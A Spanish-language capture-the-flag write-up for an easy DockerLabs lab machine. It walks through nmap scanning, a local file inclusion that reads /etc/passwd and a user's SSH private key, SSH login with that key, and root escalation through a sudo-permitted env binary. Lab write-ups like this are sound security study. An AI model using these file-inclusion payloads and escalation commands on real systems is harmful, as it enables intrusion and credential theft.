@@ -1,0 +1,147 @@
+Propiedades:
+- OS: Linux
+- Plataforma: DockerLabs
+- Nivel: Easy
+- Tags: #lfi #dockerlabs
+
+![](../assets/Pasted image 20251105000419.png)
+
+#### Reconocimiento
+
+Empiezo tirando un escaneo de nmap para ver los puertos que están abiertos
+
+```bash
+nmap -p- --open -sS -T5 --min-rate 5000 -Pn -n -oN ports.txt 172.17.0.2
+----------------------------------------------------------------------
+Nmap scan report for 172.17.0.2
+Host is up (0.0000090s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 5E:17:D0:42:D8:82 (Unknown)
+```
+- Puerto 80 y 22 abiertos
+
+Realizo un segundo escaneo para ver que servicios y versiones están corriendo
+```bash
+nmap -p 22,80 -sCV -sS -T5 --min-rate 5000 -Pn -n -oN target.txt 172.17.0.2
+----------------------------------------------------------------------------
+Nmap scan report for 172.17.0.2
+Host is up (0.000043s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
+| ssh-hostkey: 
+|   256 2e:4a:72:a0:b2:40:3a:36:99:c9:2d:a7:62:61:16:e7 (ECDSA)
+|_  256 7c:7d:78:7a:20:2b:d0:75:92:26:1b:41:3c:ca:79:3c (ED25519)
+80/tcp open  http    Apache httpd 2.4.61 ((Debian))
+|_http-server-header: Apache/2.4.61 (Debian)
+|_http-title: Advertencia: LeFvIrus
+MAC Address: 5E:17:D0:42:D8:82 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+```
+
+#### Enumeración
+
+**Puerto 80**
+![](../assets/Pasted image 20251105001227.png)
+
+Al darle al boton de ejemplos de computadoras infectadas nos lleva a esta otra vista:
+```
+> http://172.17.0.2/ejemplos.php?images=./ejemplo1.png
+```
+
+![](../assets/Pasted image 20251105002745.png)
+- La web tiene un parametro que esta tratando de traerse un archivo y mostrarlo en la web por lo que me hace pensar que puede ser vulnerable a un Local File Inclution.
+#### Explotación
+
+Sabiendo que la web esta tratando de traerse un archivo, lo que hice fue tratar de apuntar al archivo */etc/passwd* para ver si la web lo volcaba.
+```
+> ejemplos.php?images=/etc/passwd
+```
+
+La pagina volcó correctamente el archivo 
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
+messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
+sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
+nico:x:1000:1000:,,,:/home/nico:/bin/bash ---------------------------------------------------
+```
+
+- Lo primero que me llamo la atención fue el usuario _nico_
+_nico:x:1000:1000:,,,:/home/nico:/bin/bash_
+
+Por lo cual ahora sabiendo que existe un usuario llamado nico trate de apuntar a su clave _ssh_
+```
+> ejemplos.php?images=/home/nico/.ssh/id_rsa
+```
+
+La web efectivamente me volcó la clave ssh del usuario nico.
+```
+       -----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEA07BRWc6X8Yz+VwO1l5UAqcFE5K+1yQ9QxFBrt8DzyC9x7o0tluCk
+4f4gObHgatf/tXX/z8oGKYnAY48/vctJz//3M9phYgcFhoDOs+F3NgyYZ7oZN/TeEgTlql
+```
+
+Procedí a guardar la clave en mi sistema y a darle permisos.
+```bash
+> chmod 600 key
+```
+
+Me conecto mediante SSH
+```bash
+> ssh -i key nico@172.17.0.2
+----------------------------------------------------------------------------------------------------
+Linux 151ebf5d80e7 6.12.32-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.32-1parrot1 (2025-06-27) x86_64
+Last login: Wed Aug 21 21:11:09 2024 from 172.17.0.1
+nico@151ebf5d80e7:~$ whoami
+nico
+```
+
+
+#### Escalada de Privilegios
+
+Hacemos un `sudo -l` para listar binarios que podamos ejecutar como usuario root 
+
+```bash
+> sudo -l
+---------------------------------------------------------------------------------------------------------------------                                                                                                                                                 
+Matching Defaults entries for nico on 151ebf5d80e7:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User nico may run the following commands on 151ebf5d80e7:
+    (ALL) NOPASSWD: /bin/env
+```
+- Encontramos que el binario _env_ puede ser ejecutado como root
+
+Procedimos a buscar en **GTFObins** la manera de explotar el binario env
+```bash
+> nico@151ebf5d80e7:~$ sudo -u root env /bin/sh                                                                                                                                
+> whoami
+root
+```
+
+
+***PWNED**
